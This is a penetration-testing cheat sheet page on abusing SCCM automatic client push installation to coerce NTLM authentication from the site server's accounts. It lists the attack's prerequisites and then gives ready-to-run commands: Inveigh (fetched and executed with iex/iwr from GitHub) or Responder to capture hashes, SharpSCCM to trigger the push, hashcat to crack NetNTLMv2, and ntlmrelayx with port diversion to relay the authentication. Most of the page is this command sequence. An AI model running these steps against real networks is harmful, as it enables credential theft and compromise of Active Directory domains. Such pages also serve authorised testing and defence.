# Client Push

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/elevate-2-client-push

## Description

It is possible to coerce NTLM authentication from a site servers push installation account and machine account. The NTLM authentication can either be cracked offline or relayed elsewhere for authentication.

## Requirements

1) SCCM automatic site assignment and automatic client push installation are enabled

2) PKI certificates aren’t required for client authentication

3) SMB Signing disabled (If relaying authentication)

4) Domain user credentials

5) Local Administrator (If performing from Windows)

6) Fallback to NTLM authentication is not explicitly disabled (default)

## Credential Capture

### 1) Setup Capture

#### Windows

Setup Inveigh or Invoke-Inveigh to sniff for network traffic (Local Admin Required)

    Inveigh.exe

    iex (iwr -usebasicparsing https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)

    Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y -HTTPS Y -IP [Local IP>

#### Linux

Set up Responder to listen for network traffic in analyse mode.

    sudo python3 /usr/share/Responder.py -I [Interface] -A

### 2) Trigger client push installation

Trigger the client push on the site server, targeting the listening host. This process may take a couple of minutes to capture

##### SharpSCCM

    SharpSCCM.exe invoke client-push -sms [SMS Site IP] -sc [Site Code] -t [Listening IP]

### 3) Crack the hash with Hashcat

    hashcat.exe -m 5600 -a 0 -o hash.txt Wordlists\kaonashi14M.txt rules\best64.rule

## Relay Authentication

### 1)  ntlmrelayx setup

#### Windows

Before setting up ntlmrelayx on Windows we need to divert SMB traffic on port 445 to an alternate port such as 8445 with divertTCPConn (Local Administrator Required)

    divertTCPconn.exe 445 8445

Configure ntlmrelayx

    ntlmrelayx.exe --smb-port 8445 -smb2support --smb-port 8445 -ts -t [Relay Target]

#### Linux

    impacket-ntlmrelayx -smb2support -ts -ip [Interface IP] -t [Relay Target]

Trigger Push authentication then wait a minute or two to capture the authentication request.

    SharpSCCM.exe invoke client-push -sms [Site Server] -sc [Site Code] -t [Relay IP]
